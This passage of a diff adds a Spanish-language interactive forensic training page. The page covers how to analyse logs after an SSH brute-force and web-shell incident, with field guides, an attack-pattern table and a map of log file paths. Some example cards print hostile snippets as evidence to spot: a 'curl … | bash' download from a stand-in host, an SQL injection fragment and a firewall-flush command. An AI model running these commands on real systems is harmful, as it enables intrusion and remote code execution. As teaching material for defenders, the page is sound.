@@ -1,0 +1,1160 @@
+<!DOCTYPE html>
+<html lang="es" class="h-full bg-slate-950 text-slate-100">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Laboratorio Forense de Análisis de Logs Post-Incidente</title>
+  <!-- Tailwind CSS via CDN -->
+  <script src="https://cdn.tailwindcss.com"></script>
+  <!-- FontAwesome for Icons -->
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+  <!-- Google Fonts: Inter & JetBrains Mono -->
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet">
+  
+  <script>
+    tailwind.config = {
+      theme: {
+        extend: {
+          fontFamily: {
+            sans: ['Inter', 'sans-serif'],
+            mono: ['JetBrains Mono', 'monospace'],
+          },
+          colors: {
+            soc: {
+              bg: '#0B0F19',
+              card: '#111827',
+              border: '#1F2937',
+              accent: '#3B82F6',
+              danger: '#EF4444',
+              warning: '#F59E0B',
+              success: '#10B981',
+              highlight: '#8B5CF6'
+            }
+          }
+        }
+      }
+    }
+  </script>
+  <style>
+    /* Custom Scrollbars */
+    ::-webkit-scrollbar {
+      width: 6px;
+      height: 6px;
+    }
+    ::-webkit-scrollbar-track {
+      background: #0b0f19;
+    }
+    ::-webkit-scrollbar-thumb {
+      background: #1f2937;
+      border-radius: 3px;
+    }
+    ::-webkit-scrollbar-thumb:hover {
+      background: #374151;
+    }
+    .mono-text {
+      font-family: 'JetBrains Mono', monospace;
+    }
+    .animate-pulse-fast {
+      animation: pulse 1s cubic-bezier(0.4, 0, 0.6, 1) infinite;
+    }
+  </style>
+</head>
+<body class="h-full flex flex-col font-sans bg-soc-bg text-slate-200 antialiased overflow-hidden">
+
+  <!-- TOP HEADER / SOC NAVBAR -->
+  <header class="bg-soc-card border-b border-soc-border px-4 py-3 flex items-center justify-between shrink-0">
+    <div class="flex items-center space-x-3">
+      <div class="bg-red-950/80 text-red-400 border border-red-800/50 p-2 rounded-lg flex items-center justify-center">
+        <i class="fa-solid fa-shield-cat text-xl animate-pulse"></i>
+      </div>
+      <div>
+        <div class="flex items-center space-x-2">
+          <h1 class="text-base font-bold text-white tracking-wide">SOC Digital Forensics Lab</h1>
+          <span class="bg-red-500/20 text-red-400 border border-red-500/30 text-xs px-2 py-0.5 rounded font-mono font-semibold">INCIDENT #INC-2026-8941</span>
+        </div>
+        <p class="text-xs text-slate-400">Análisis Forense Post-Incidente: Ataque Combinado (SSH Brute Force + Web Shell RCE)</p>
+      </div>
+    </div>
+
+    <!-- MAIN NAVIGATION TABS -->
+    <nav class="hidden md:flex space-x-1 bg-slate-900/80 p-1 rounded-lg border border-slate-800">
+      <button onclick="switchTab('viewer')" id="tab-btn-viewer" class="tab-btn active px-3 py-1.5 rounded-md text-xs font-medium flex items-center space-x-2 transition-all bg-soc-accent text-white shadow-sm">
+        <i class="fa-solid fa-[#000] fa-terminal"></i>
+        <span>Visor de Logs</span>
+      </button>
+      <button onclick="switchTab('guide')" id="tab-btn-guide" class="tab-btn px-3 py-1.5 rounded-md text-xs font-medium text-slate-400 hover:text-slate-200 hover:bg-slate-800/50 flex items-center space-x-2 transition-all">
+        <i class="fa-solid fa-magnifying-glass-chart"></i>
+        <span>Campos & Evidencias</span>
+      </button>
+      <button onclick="switchTab('locations')" id="tab-btn-locations" class="tab-btn px-3 py-1.5 rounded-md text-xs font-medium text-slate-400 hover:text-slate-200 hover:bg-slate-800/50 flex items-center space-x-2 transition-all">
+        <i class="fa-solid fa-folder-tree"></i>
+        <span>¿Dónde Buscar? (Paths)</span>
+      </button>
+      <button onclick="switchTab('quiz')" id="tab-btn-quiz" class="tab-btn px-3 py-1.5 rounded-md text-xs font-medium text-slate-400 hover:text-slate-200 hover:bg-slate-800/50 flex items-center space-x-2 transition-all">
+        <i class="fa-solid fa-graduation-cap"></i>
+        <span>Reto Forense (Quiz)</span>
+        <span id="quiz-badge" class="bg-amber-500/20 text-amber-300 text-[10px] px-1.5 py-0.5 rounded-full border border-amber-500/30">0/5</span>
+      </button>
+    </nav>
+
+    <!-- STATUS & INFO -->
+    <div class="flex items-center space-x-3">
+      <div class="text-right hidden sm:block">
+        <div class="text-xs text-slate-400">Servidor Objetivo</div>
+        <div class="text-xs font-mono text-emerald-400 font-semibold">srv-prod-web-01 (192.168.1.45)</div>
+      </div>
+      <button onclick="resetLab()" class="bg-slate-800 hover:bg-slate-700 text-slate-300 border border-slate-700 p-2 rounded-lg text-xs flex items-center space-x-1 transition" title="Reiniciar Escenario">
+        <i class="fa-solid fa-rotate-right"></i>
+      </button>
+    </div>
+  </header>
+
+  <!-- MOBILE TAB NAVIGATION -->
+  <div class="md:hidden flex bg-slate-900 border-b border-slate-800 p-1 overflow-x-auto shrink-0">
+    <button onclick="switchTab('viewer')" id="mob-tab-btn-viewer" class="mob-tab-btn flex-1 py-1.5 px-3 text-xs font-medium text-center text-white bg-soc-accent rounded">SIEM Logs</button>
+    <button onclick="switchTab('guide')" id="mob-tab-btn-guide" class="mob-tab-btn flex-1 py-1.5 px-3 text-xs font-medium text-center text-slate-400 rounded">Campos</button>
+    <button onclick="switchTab('locations')" id="mob-tab-btn-locations" class="mob-tab-btn flex-1 py-1.5 px-3 text-xs font-medium text-center text-slate-400 rounded">Rutas</button>
+    <button onclick="switchTab('quiz')" id="mob-tab-btn-quiz" class="mob-tab-btn flex-1 py-1.5 px-3 text-xs font-medium text-center text-slate-400 rounded">Reto</button>
+  </div>
+
+  <!-- MAIN BODY AREA -->
+  <main class="flex-1 flex overflow-hidden relative">
+
+    <!-- TAB 1: VISOR DE LOGS SIEM / KIBANA STYLE -->
+    <section id="tab-viewer" class="tab-content flex-1 flex flex-col md:flex-row overflow-hidden w-full">
+      
+      <!-- LOG LIST / FILTER PANEL -->
+      <div class="flex-1 flex flex-col min-w-0 border-r border-soc-border bg-soc-bg">
+        
+        <!-- CONTROL BAR / FILTERS -->
+        <div class="p-3 bg-soc-card border-b border-soc-border flex flex-wrap gap-2 items-center justify-between shrink-0">
+          <div class="flex flex-wrap items-center gap-2">
+            <!-- Search Bar -->
+            <div class="relative min-w-[200px]">
+              <i class="fa-solid fa-magnifying-glass absolute left-3 top-2.5 text-xs text-slate-500"></i>
+              <input type="text" id="log-search" oninput="filterLogs()" placeholder="Buscar IP, comando, código..." class="w-full bg-slate-900 border border-slate-700 rounded-md pl-8 pr-3 py-1.5 text-xs text-slate-200 placeholder-slate-500 focus:outline-none focus:border-soc-accent">
+            </div>
+
+            <!-- Service Filter -->
+            <select id="filter-service" onchange="filterLogs()" class="bg-slate-900 border border-slate-700 rounded-md px-2.5 py-1.5 text-xs text-slate-300 focus:outline-none focus:border-soc-accent">
+              <option value="ALL">Todos los Servicios</option>
+              <option value="authlog">Linux Auth (/var/log/auth.log)</option>
+              <option value="nginx">Nginx Access Log</option>
+              <option value="auditd">Linux Auditd (/var/log/audit.log)</option>
+              <option value="syslog">Syslog / Systemd</option>
+            </select>
+
+            <!-- Severity Filter -->
+            <select id="filter-severity" onchange="filterLogs()" class="bg-slate-900 border border-slate-700 rounded-md px-2.5 py-1.5 text-xs text-slate-300 focus:outline-none focus:border-soc-accent">
+              <option value="ALL">Todas las Severidades</option>
+              <option value="CRITICAL">Critical / Intrusion</option>
+              <option value="WARNING">Warning / Failed</option>
+              <option value="INFO">Info / Normal</option>
+            </select>
+
+            <!-- Anomalies Only Switch -->
+            <label class="flex items-center space-x-1.5 cursor-pointer bg-slate-900 border border-slate-700 px-2.5 py-1.5 rounded-md text-xs text-slate-300 hover:bg-slate-800">
+              <input type="checkbox" id="filter-anomalies" onchange="filterLogs()" class="rounded bg-slate-950 border-slate-700 text-soc-accent focus:ring-0">
+              <span class="text-amber-400 font-medium"><i class="fa-solid fa-triangle-exclamation mr-1"></i>Solo Anomalías</span>
+            </label>
+          </div>
+
+          <div class="text-xs text-slate-400 font-mono">
+            Mostrando <span id="log-count-visible" class="text-soc-accent font-bold">0</span> / <span id="log-count-total">0</span> eventos
+          </div>
+        </div>
+
+        <!-- TIMELINE BRIEF WRAPPER -->
+        <div class="bg-slate-900/50 border-b border-soc-border px-4 py-2 flex items-center justify-between text-xs text-slate-400 shrink-0">
+          <div class="flex items-center space-x-4">
+            <span class="font-semibold text-slate-300 flex items-center"><i class="fa-solid fa-clock-rotate-left mr-1.5 text-soc-accent"></i>Línea de Tiempo del Incidente (UTC):</span>
+            <span class="font-mono text-slate-300">14:02:10 - Brute Force SSH</span>
+            <span class="text-slate-600">➔</span>
+            <span class="font-mono text-slate-300">14:05:22 - Exploitation Web (SQLi/Upload)</span>
+            <span class="text-slate-600">➔</span>
+            <span class="font-mono text-red-400 font-bold">14:06:15 - RCE / Reverse Shell</span>
+          </div>
+          <button onclick="highlightAttackPath()" class="text-xs bg-soc-accent/20 text-soc-accent border border-soc-accent/30 hover:bg-soc-accent hover:text-white px-2 py-0.5 rounded transition">
+            <i class="fa-solid fa-wand-magic-sparkles mr-1"></i>Resaltar Cadena de Ataque
+          </button>
+        </div>
+
+        <!-- LOG LIST TERMINAL VIEW -->
+        <div class="flex-1 overflow-y-auto p-2 bg-slate-950 font-mono text-xs space-y-1" id="logs-container">
+          <!-- Dynamically Populated -->
+        </div>
+      </div>
+
+      <!-- LOG DETAILS SIDE PANEL -->
+      <div id="detail-panel" class="w-full md:w-[420px] lg:w-[480px] bg-soc-card border-l border-soc-border flex flex-col shrink-0 overflow-y-auto hidden">
+        <div class="p-3 bg-slate-900 border-b border-soc-border flex items-center justify-between sticky top-0 z-10">
+          <div class="flex items-center space-x-2">
+            <i class="fa-solid fa-microscope text-soc-accent"></i>
+            <h3 class="font-bold text-sm text-white">Desglose de Campos Forenses</h3>
+          </div>
+          <button onclick="closeDetailPanel()" class="text-slate-400 hover:text-white p-1 rounded">
+            <i class="fa-solid fa-xmark text-base"></i>
+          </button>
+        </div>
+
+        <div class="p-4 space-y-4" id="detail-content">
+          <!-- Dynamically populated detail view -->
+        </div>
+      </div>
+
+    </section>
+
+    <!-- TAB 2: GUÍA DIDÁCTICA (CAMPOS Y EVIDENCIAS) -->
+    <section id="tab-guide" class="tab-content flex-1 p-4 md:p-6 overflow-y-auto bg-soc-bg hidden">
+      <div class="max-w-6xl mx-auto space-y-6">
+        
+        <!-- Header -->
+        <div class="bg-gradient-to-r from-blue-950/40 via-soc-card to-slate-900 border border-slate-800 rounded-xl p-6">
+          <div class="flex items-start justify-between">
+            <div>
+              <span class="bg-blue-500/20 text-blue-400 border border-blue-500/30 text-xs px-2.5 py-1 rounded-full font-mono font-semibold">METODOLOGÍA DFIR</span>
+              <h2 class="text-xl font-bold text-white mt-2">¿Cómo Identificar Evidencias y Campos Clave en Logs?</h2>
+              <p class="text-sm text-slate-300 mt-1 max-w-3xl">
+                Durante el análisis forense post-incidente, la cantidad de logs puede ser abrumadora. La clave consiste en filtrar por artefactos sospechosos y analizar la estructura de cada campo para reconstruir la línea temporal del atacante.
+              </p>
+            </div>
+            <i class="fa-solid fa-book-bookmark text-4xl text-soc-accent/40"></i>
+          </div>
+        </div>
+
+        <!-- Interactive Fields Breakdown -->
+        <h3 class="text-lg font-bold text-white flex items-center space-x-2">
+          <i class="fa-solid fa-key text-amber-400"></i>
+          <span>Los 8 Campos Fundamentales en una Investigación</span>
+        </h3>
+
+        <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-4">
+          
+          <!-- Card 1 -->
+          <div class="bg-soc-card border border-soc-border hover:border-slate-700 p-4 rounded-xl space-y-2 transition">
+            <div class="flex items-center justify-between">
+              <span class="text-xs font-mono bg-blue-950 text-blue-400 px-2 py-0.5 rounded border border-blue-800">Timestamp</span>
+              <i class="fa-regular fa-clock text-slate-500"></i>
+            </div>
+            <h4 class="font-bold text-white text-sm">Timestamp UTC / Epoch</h4>
+            <p class="text-xs text-slate-400">Permite la correlación temporal exacta entre múltiples servidores y artefactos de red.</p>
+            <div class="bg-slate-950 p-2 rounded text-[11px] font-mono text-emerald-400 border border-slate-800">
+              <span class="text-slate-500">Ej:</span> 2026-11-06T14:06:15Z
+            </div>
+            <div class="text-[11px] text-amber-300/80 italic">
+              💡 Busca: Ráfagas inusuales de peticiones en milisegundos (Brute force o Scripts automatizados).
+            </div>
+          </div>
+
+          <!-- Card 2 -->
+          <div class="bg-soc-card border border-soc-border hover:border-slate-700 p-4 rounded-xl space-y-2 transition">
+            <div class="flex items-center justify-between">
+              <span class="text-xs font-mono bg-indigo-950 text-indigo-400 px-2 py-0.5 rounded border border-indigo-800">Source IP</span>
+              <i class="fa-solid fa-network-wired text-slate-500"></i>
+            </div>
+            <h4 class="font-bold text-white text-sm">IP Origen & Puerto</h4>
+            <p class="text-xs text-slate-400">Identifica el origen del tráfico. Permite buscar en Inteligencia de Amenazas (VirusTotal, AbuseIPDB).</p>
+            <div class="bg-slate-950 p-2 rounded text-[11px] font-mono text-emerald-400 border border-slate-800">
+              <span class="text-slate-500">Ej:</span> 198.51.100.77:44321
+            </div>
+            <div class="text-[11px] text-amber-300/80 italic">
+              💡 Busca: IPs públicas sospechosas, proxies TOR, o IPs internas pivotando de manera anómala.
+            </div>
+          </div>
+
+          <!-- Card 3 -->
+          <div class="bg-soc-card border border-soc-border hover:border-slate-700 p-4 rounded-xl space-y-2 transition">
+            <div class="flex items-center justify-between">
+              <span class="text-xs font-mono bg-purple-950 text-purple-400 px-2 py-0.5 rounded border border-purple-800">HTTP Status</span>
+              <i class="fa-solid fa-server text-slate-500"></i>
+            </div>
+            <h4 class="font-bold text-white text-sm">Código Status HTTP</h4>
+            <p class="text-xs text-slate-400">Revela si el intento de ataque falló o si tuvo éxito al acceder al recurso.</p>
+            <div class="bg-slate-950 p-2 rounded text-[11px] font-mono border border-slate-800 flex justify-between">
+              <span class="text-red-400">401/403 (Denegado)</span>
+              <span class="text-emerald-400">200 OK (Éxito)</span>
+            </div>
+            <div class="text-[11px] text-amber-300/80 italic">
+              💡 Patrón: Decenas de respuestas 401/404 seguidas inmediatamente de un 200 OK = Explotación exitosa.
+            </div>
+          </div>
+
+          <!-- Card 4 -->
+          <div class="bg-soc-card border border-soc-border hover:border-slate-700 p-4 rounded-xl space-y-2 transition">
+            <div class="flex items-center justify-between">
+              <span class="text-xs font-mono bg-pink-950 text-pink-400 px-2 py-0.5 rounded border border-pink-800">User-Agent</span>
+              <i class="fa-solid fa-fingerprint text-slate-500"></i>
+            </div>
+            <h4 class="font-bold text-white text-sm">User-Agent Anomalous</h4>
+            <p class="text-xs text-slate-400">Identifica la herramienta cliente utilizada por el atacante o el script malicioso.</p>
+            <div class="bg-slate-950 p-2 rounded text-[11px] font-mono text-red-400 border border-slate-800 truncate">
+              sqlmap/1.6#stable / python-requests
+            </div>
+            <div class="text-[11px] text-amber-300/80 italic">
+              💡 Busca: Escáneres automáticos (Nmap, Nikto, Gobuster) o User-Agents vacíos / modificados.
+            </div>
+          </div>
+
+          <!-- Card 5 -->
+          <div class="bg-soc-card border border-soc-border hover:border-slate-700 p-4 rounded-xl space-y-2 transition">
+            <div class="flex items-center justify-between">
+              <span class="text-xs font-mono bg-emerald-950 text-emerald-400 px-2 py-0.5 rounded border border-emerald-800">Payload</span>
+              <i class="fa-solid fa-code text-slate-500"></i>
+            </div>
+            <h4 class="font-bold text-white text-sm">URI Request / Encodings</h4>
+            <p class="text-xs text-slate-400">La secuencia de caracteres enviada en la URL o cuerpo POST para vulnerar la app.</p>
+            <div class="bg-slate-950 p-2 rounded text-[11px] font-mono text-amber-300 border border-slate-800 truncate">
+              /api.php?id=1%27%20UNION%20SELECT...
+            </div>
+            <div class="text-[11px] text-amber-300/80 italic">
+              💡 Busca: Codificación Hexadecimal (`%20`, `%27`), Base64 (`eval(base64_decode(...))`), o Path Traversal (`../`).
+            </div>
+          </div>
+
+          <!-- Card 6 -->
+          <div class="bg-soc-card border border-soc-border hover:border-slate-700 p-4 rounded-xl space-y-2 transition">
+            <div class="flex items-center justify-between">
+              <span class="text-xs font-mono bg-amber-950 text-amber-400 px-2 py-0.5 rounded border border-amber-800">UID / Account</span>
+              <i class="fa-solid fa-user-shield text-slate-500"></i>
+            </div>
+            <h4 class="font-bold text-white text-sm">Usuario Contextual (UID)</h4>
+            <p class="text-xs text-slate-400">Cuenta del sistema en cuyo contexto se ejecutó la acción (www-data, root, administrator).</p>
+            <div class="bg-slate-950 p-2 rounded text-[11px] font-mono text-sky-400 border border-slate-800">
+              uid=33(www-data) euid=0(root)
+            </div>
+            <div class="text-[11px] text-amber-300/80 italic">
+              💡 Busca: Alertas de Escalada de Privilegios (procesos de www-data ejecutando `sudo` o `su`).
+            </div>
+          </div>
+
+          <!-- Card 7 -->
+          <div class="bg-soc-card border border-soc-border hover:border-slate-700 p-4 rounded-xl space-y-2 transition">
+            <div class="flex items-center justify-between">
+              <span class="text-xs font-mono bg-red-950 text-red-400 px-2 py-0.5 rounded border border-red-800">Audit Exec</span>
+              <i class="fa-solid fa-terminal text-slate-500"></i>
+            </div>
+            <h4 class="font-bold text-white text-sm">Command Execution String</h4>
+            <p class="text-xs text-slate-400">Comando exacto de sistema operativo disparado por el proceso o la webshell.</p>
+            <div class="bg-slate-950 p-2 rounded text-[11px] font-mono text-red-400 border border-slate-800 truncate">
+              curl -s http://bad.com/sh | bash
+            </div>
+            <div class="text-[11px] text-amber-300/80 italic">
+              💡 Busca: Descargas automáticas, deshabilitación de firewall (`iptables -F`), recon (`whoami`, `id`, `uname -a`).
+            </div>
+          </div>
+
+          <!-- Card 8 -->
+          <div class="bg-soc-card border border-soc-border hover:border-slate-700 p-4 rounded-xl space-y-2 transition">
+            <div class="flex items-center justify-between">
+              <span class="text-xs font-mono bg-cyan-950 text-cyan-400 px-2 py-0.5 rounded border border-cyan-800">PID / PPID</span>
+              <i class="fa-solid fa-sitemap text-slate-500"></i>
+            </div>
+            <h4 class="font-bold text-white text-sm">PID & Parent Process ID</h4>
+            <p class="text-xs text-slate-400">Relación padre-hijo de procesos para rastrear el origen de la ejecución sospechosa.</p>
+            <div class="bg-slate-950 p-2 rounded text-[11px] font-mono text-cyan-300 border border-slate-800">
+              ppid=1420 (nginx) -> pid=8841 (bash)
+            </div>
+            <div class="text-[11px] text-amber-300/80 italic">
+              💡 Anomalia: Un servidor Web (Nginx/Apache) no debería lanzar un intérprete interactivo (`/bin/sh` o `cmd.exe`).
+            </div>
+          </div>
+
+        </div>
+
+        <!-- Pattern Detection Matrix -->
+        <div class="bg-soc-card border border-soc-border rounded-xl p-5 space-y-4">
+          <h3 class="text-base font-bold text-white flex items-center space-x-2">
+            <i class="fa-solid fa-wand-magic-sparkles text-soc-accent"></i>
+            <span>Matriz de Patrones de Ataque vs Registros de Log</span>
+          </h3>
+
+          <div class="overflow-x-auto">
+            <table class="w-full text-left text-xs border-collapse">
+              <thead>
+                <tr class="border-b border-slate-800 text-slate-400 font-mono bg-slate-950/60">
+                  <th class="p-3">Vector de Ataque</th>
+                  <th class="p-3">Log a Consultar</th>
+                  <th class="p-3">Patrón Característico / Evidencia</th>
+                  <th class="p-3">Nivel Severidad</th>
+                </tr>
+              </thead>
+              <tbody class="divide-y divide-slate-800/60 text-slate-300">
+                <tr class="hover:bg-slate-900/40">
+                  <td class="p-3 font-semibold text-white">SSH Brute Force</td>
+                  <td class="p-3 font-mono text-cyan-400">/var/log/auth.log</td>
+                  <td class="p-3">Múltiples entradas <code class="text-amber-400">Failed password for invalid user</code> desde la misma IP en poco tiempo.</td>
+                  <td class="p-3"><span class="bg-amber-500/20 text-amber-400 px-2 py-0.5 rounded">Medio / Alto</span></td>
+                </tr>
+                <tr class="hover:bg-slate-900/40">
+                  <td class="p-3 font-semibold text-white">Web Shell / RCE</td>
+                  <td class="p-3 font-mono text-cyan-400">Nginx access.log + Auditd</td>
+                  <td class="p-3">Peticiones POST a archivos `.php` desconocidos en `/uploads/` seguidas de spawning de `/bin/sh` en Auditd.</td>
+                  <td class="p-3"><span class="bg-red-500/20 text-red-400 px-2 py-0.5 rounded font-bold">CRÍTICO</span></td>
+                </tr>
+                <tr class="hover:bg-slate-900/40">
+                  <td class="p-3 font-semibold text-white">SQL Injection (SQLi)</td>
+                  <td class="p-3 font-mono text-cyan-400">Web Access Log</td>
+                  <td class="p-3">Parámetros URL con sintaxis SQL (<code class="text-amber-400">' UNION SELECT NULL, version()--</code>) o User-Agent `sqlmap`.</td>
+                  <td class="p-3"><span class="bg-red-500/20 text-red-400 px-2 py-0.5 rounded font-bold">Alto</span></td>
+                </tr>
+                <tr class="hover:bg-slate-900/40">
+                  <td class="p-3 font-semibold text-white">Persistencia / PrivEsc</td>
+                  <td class="p-3 font-mono text-cyan-400">/var/log/syslog & auth.log</td>
+                  <td class="p-3">Modificaciones en <code class="text-amber-400">/etc/crontab</code>, creación de nuevos usuarios UID 0 o comandos `sudo` anómalos.</td>
+                  <td class="p-3"><span class="bg-red-500/20 text-red-400 px-2 py-0.5 rounded font-bold">CRÍTICO</span></td>
+                </tr>
+              </tbody>
+            </table>
+          </div>
+        </div>
+
+      </div>
+    </section>
+
+    <!-- TAB 3: MAPA DE UBICACIÓN DE LOGS (¿DÓNDE BUSCAR?) -->
+    <section id="tab-locations" class="tab-content flex-1 p-4 md:p-6 overflow-y-auto bg-soc-bg hidden">
+      <div class="max-w-6xl mx-auto space-y-6">
+        
+        <!-- Header -->
+        <div class="flex items-center justify-between bg-soc-card border border-soc-border p-5 rounded-xl">
+          <div>
+            <h2 class="text-xl font-bold text-white">Mapa Interactivo de Rutas y Archivos de Logs</h2>
+            <p class="text-xs text-slate-400 mt-1">Guía rápida de ubicación física de artefactos según el Sistema Operativo, Servidor Web y SIEM.</p>
+          </div>
+          <div class="flex space-x-2">
+            <button onclick="filterPaths('all')" class="path-btn active bg-soc-accent text-white px-3 py-1.5 rounded text-xs font-medium">Todos</button>
+            <button onclick="filterPaths('linux')" class="path-btn bg-slate-800 text-slate-300 hover:bg-slate-700 px-3 py-1.5 rounded text-xs font-medium">Linux OS</button>
+            <button onclick="filterPaths('windows')" class="path-btn bg-slate-800 text-slate-300 hover:bg-slate-700 px-3 py-1.5 rounded text-xs font-medium">Windows Event</button>
+            <button onclick="filterPaths('web')" class="path-btn bg-slate-800 text-slate-300 hover:bg-slate-700 px-3 py-1.5 rounded text-xs font-medium">Web Servers</button>
+            <button onclick="filterPaths('siem')" class="path-btn bg-slate-800 text-slate-300 hover:bg-slate-700 px-3 py-1.5 rounded text-xs font-medium">SIEM / Elastic</button>
+          </div>
+        </div>
+
+        <!-- Grid of Locations -->
+        <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4" id="paths-grid">
+          
+          <!-- Linux Auth Card -->
+          <div class="path-card path-linux bg-soc-card border border-soc-border rounded-xl p-4 space-y-3">
+            <div class="flex items-center justify-between">
+              <span class="text-xs font-semibold text-emerald-400 bg-emerald-950/60 border border-emerald-800 px-2 py-0.5 rounded">Linux System</span>
+              <i class="fa-brands fa-linux text-xl text-slate-400"></i>
+            </div>
+            <div>
+              <h4 class="text-sm font-bold text-white">Linux Autenticación & Accesos</h4>
+              <p class="text-xs text-slate-400 mt-0.5">Registra incios de sesión SSH, escalada con sudo, errores de login y PAM.</p>
+            </div>
+            <div class="space-y-1">
+              <div class="bg-slate-950 p-2 rounded text-xs font-mono text-cyan-300 flex items-center justify-between">
+                <span>/var/log/auth.log</span>
+                <span class="text-[10px] text-slate-500">Debian/Ubuntu</span>
+              </div>
+              <div class="bg-slate-950 p-2 rounded text-xs font-mono text-cyan-300 flex items-center justify-between">
+                <span>/var/log/secure</span>
+                <span class="text-[10px] text-slate-500">RHEL/CentOS</span>
+              </div>
+            </div>
+            <div class="text-[11px] text-slate-400">
+              <strong class="text-slate-300">Evidencias clave:</strong> Intrusiones SSH, ataques de fuerza bruta, ejecución no autorizada de `sudo`.
+            </div>
+          </div>
+
+          <!-- Web Servers Card -->
+          <div class="path-card path-web bg-soc-card border border-soc-border rounded-xl p-4 space-y-3">
+            <div class="flex items-center justify-between">
+              <span class="text-xs font-semibold text-blue-400 bg-blue-950/60 border border-blue-800 px-2 py-0.5 rounded">Web Servers</span>
+              <i class="fa-solid fa-globe text-xl text-slate-400"></i>
+            </div>
+            <div>
+              <h4 class="text-sm font-bold text-white">Nginx & Apache Web Logs</h4>
+              <p class="text-xs text-slate-400 mt-0.5">Peticiones HTTP/HTTPS entrantes, respuestas del servidor y errores del engine.</p>
+            </div>
+            <div class="space-y-1">
+              <div class="bg-slate-950 p-2 rounded text-xs font-mono text-cyan-300">/var/log/nginx/access.log</div>
+              <div class="bg-slate-950 p-2 rounded text-xs font-mono text-cyan-300">/var/log/apache2/access.log</div>
+              <div class="bg-slate-950 p-2 rounded text-xs font-mono text-cyan-300">/var/log/nginx/error.log</div>
+            </div>
+            <div class="text-[11px] text-slate-400">
+              <strong class="text-slate-300">Evidencias clave:</strong> SQLi, XSS, upload de WebShells, fuzzing de rutas y peticiones 404/500.
+            </div>
+          </div>
+
+          <!-- Linux Auditd Card -->
+          <div class="path-card path-linux bg-soc-card border border-soc-border rounded-xl p-4 space-y-3">
+            <div class="flex items-center justify-between">
+              <span class="text-xs font-semibold text-purple-400 bg-purple-950/60 border border-purple-800 px-2 py-0.5 rounded">Kernel & Audit</span>
+              <i class="fa-solid fa-terminal text-xl text-slate-400"></i>
+            </div>
+            <div>
+              <h4 class="text-sm font-bold text-white">Linux Auditd Framework</h4>
+              <p class="text-xs text-slate-400 mt-0.5">Registra syscalls del kernel, ejecución de Binarios, cambios de permisos y archivos.</p>
+            </div>
+            <div class="space-y-1">
+              <div class="bg-slate-950 p-2 rounded text-xs font-mono text-cyan-300">/var/log/audit/audit.log</div>
+              <div class="bg-slate-950 p-2 rounded text-xs font-mono text-cyan-300">/var/log/syslog</div>
+              <div class="bg-slate-950 p-2 rounded text-xs font-mono text-cyan-300">dmesg (Kernel Ring Buffer)</div>
+            </div>
+            <div class="text-[11px] text-slate-400">
+              <strong class="text-slate-300">Evidencias clave:</strong> Comandos ejecutados en el SO (`execve`), modificación de `/etc/shadow`.
+            </div>
+          </div>
+
+          <!-- Windows Events Card -->
+          <div class="path-card path-windows bg-soc-card border border-soc-border rounded-xl p-4 space-y-3">
+            <div class="flex items-center justify-between">
+              <span class="text-xs font-semibold text-sky-400 bg-sky-950/60 border border-sky-800 px-2 py-0.5 rounded">Windows OS</span>
+              <i class="fa-brands fa-windows text-xl text-slate-400"></i>
+            </div>
+            <div>
+              <h4 class="text-sm font-bold text-white">Windows Event Log IDs</h4>
+              <p class="text-xs text-slate-400 mt-0.5">Visor de eventos de Windows (Security.evtx, System.evtx).</p>
+            </div>
+            <div class="space-y-1 font-mono text-xs">
+              <div class="bg-slate-950 p-1.5 rounded text-amber-300">Event ID 4624: <span class="text-slate-300 font-sans">Successful Logon</span></div>
+              <div class="bg-slate-950 p-1.5 rounded text-red-400">Event ID 4625: <span class="text-slate-300 font-sans">Failed Logon</span></div>
+              <div class="bg-slate-950 p-1.5 rounded text-emerald-400">Event ID 4688: <span class="text-slate-300 font-sans">Process Creation</span></div>
+              <div class="bg-slate-950 p-1.5 rounded text-purple-400">Event ID 1102: <span class="text-slate-300 font-sans">Audit Log Cleared</span></div>
+            </div>
+            <div class="text-[11px] text-slate-400">
+              <strong class="text-slate-300">Ruta habitual:</strong> <code class="text-cyan-300">%SystemRoot%\System32\Winevt\Logs\</code>
+            </div>
+          </div>
+
+          <!-- SIEM Elastic Card -->
+          <div class="path-card path-siem bg-soc-card border border-soc-border rounded-xl p-4 space-y-3">
+            <div class="flex items-center justify-between">
+              <span class="text-xs font-semibold text-pink-400 bg-pink-950/60 border border-pink-800 px-2 py-0.5 rounded">SIEM Indexing</span>
+              <i class="fa-solid fa-database text-xl text-slate-400"></i>
+            </div>
+            <div>
+              <h4 class="text-sm font-bold text-white">Índices en Elastic / Kibana</h4>
+              <p class="text-xs text-slate-400 mt-0.5">Nombres estandarizados de índices al consultar un SIEM centralizado.</p>
+            </div>
+            <div class="space-y-1">
+              <div class="bg-slate-950 p-2 rounded text-xs font-mono text-pink-300">filebeat-* (Logs de Archivo)</div>
+              <div class="bg-slate-950 p-2 rounded text-xs font-mono text-pink-300">winlogbeat-* (Windows Events)</div>
+              <div class="bg-slate-950 p-2 rounded text-xs font-mono text-pink-300">auditbeat-* (Audit System)</div>
+            </div>
+            <div class="text-[11px] text-slate-400">
+              <strong class="text-slate-300">Ventaja:</strong> Permite búsquedas masivas KQL / Lucene cruzando servidores en tiempo real.
+            </div>
+          </div>
+
+          <!-- Linux Persistent Artifacts Card -->
+          <div class="path-card path-linux bg-soc-card border border-soc-border rounded-xl p-4 space-y-3">
+            <div class="flex items-center justify-between">
+              <span class="text-xs font-semibold text-amber-400 bg-amber-950/60 border border-amber-800 px-2 py-0.5 rounded">Linux Artifacts</span>
+              <i class="fa-solid fa-clock text-xl text-slate-400"></i>
+            </div>
+            <div>
+              <h4 class="text-sm font-bold text-white">Históricos y Cron Tasks</h4>
+              <p class="text-xs text-slate-400 mt-0.5">Logs de tareas programadas y comandos directos de usuario.</p>
+            </div>
+            <div class="space-y-1">
+              <div class="bg-slate-950 p-2 rounded text-xs font-mono text-cyan-300">/var/log/cron</div>
+              <div class="bg-slate-950 p-2 rounded text-xs font-mono text-cyan-300">~/.bash_history</div>
+              <div class="bg-slate-950 p-2 rounded text-xs font-mono text-cyan-300">/var/log/dpkg.log (Paquetes inst.)</div>
+            </div>
+            <div class="text-[11px] text-slate-400">
+              <strong class="text-slate-300">Evidencias clave:</strong> Instalación de herramientas de hacking, tareas persistence repetitivas.
